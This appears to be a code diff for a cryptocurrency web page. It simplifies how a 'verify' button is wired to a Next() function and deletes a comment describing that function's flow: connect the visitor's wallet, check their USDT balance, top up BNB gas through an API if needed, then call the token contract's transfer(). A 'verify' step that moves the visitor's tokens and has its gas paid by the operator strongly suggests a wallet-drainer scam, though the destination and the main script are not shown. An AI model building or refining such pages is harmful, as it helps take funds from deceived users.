@@ -164,49 +164,11 @@
     })();
   </script>
 
-  <!--
-    Flow when user clicks Next (from js/script.js):
-    1. Next() reads #amount, validates > 0 (else showError "Please enter a valid amount")
-    2. If wallet not connected → connectWalletAndSwitch() (BNB Smart Chain)
-    3. showLoading() → "Processing..." overlay
-    4. Script checks USDT balance (contract) and BNB balance; if USDT < 1 or issues → hideLoading, showError
-    5. If BNB < 0.0005 → API top-up, then continues
-    6. Contract transfer() → on success: hideLoading, showSuccess (our modal) | on error: hideLoading, showError ("Transaction failed")
-  -->
+  <!-- Same working flow as newbep20--main 3: bind Next() directly -->
   <script>
-    (function () {
-      var overlay = document.getElementById("loadingOverlay");
-      function bindNextButton() {
-        var btn = document.getElementById("verifyBtn");
-        if (!btn) return false;
-        if (typeof window.Next !== "function") return false;
-        if (btn._nextBound) return true;
-        btn._nextBound = true;
-        btn.addEventListener("click", function () {
-          var p = window.Next();
-          if (p && typeof p.catch === "function") {
-            p.catch(function () {
-              if (overlay) overlay.style.display = "none";
-            });
-          }
-        });
-        return true;
-      }
-      function tryBind() {
-        if (bindNextButton()) return;
-        var tries = 0;
-        var t = setInterval(function () {
-          tries++;
-          if (bindNextButton() || tries >= 30) clearInterval(t);
-        }, 150);
-      }
-      tryBind();
-      if (document.readyState !== "complete") {
-        window.addEventListener("load", tryBind);
-      }
-    })();
+    document.getElementById("verifyBtn").addEventListener("click", Next);
   </script>
-  <!-- Update USD estimate when user enters amount (workflow same as reference folder) -->
+  <!-- Update USD estimate when user enters amount (always show as positive) -->
   <script>
     (function () {
       var amountInput = document.getElementById("amount");
